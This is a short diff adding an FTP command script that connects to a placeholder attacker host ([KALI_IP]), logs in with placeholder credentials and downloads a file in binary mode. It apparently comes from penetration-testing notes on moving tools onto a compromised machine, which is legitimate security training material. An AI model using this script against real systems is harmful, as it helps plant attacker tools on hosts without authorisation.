@@ -1,0 +1,6 @@
+open [KALI_IP] 21
+USER [FTP_USER]
+[FTP_PASSWORD]
+bin
+GET [FILE]
+bye
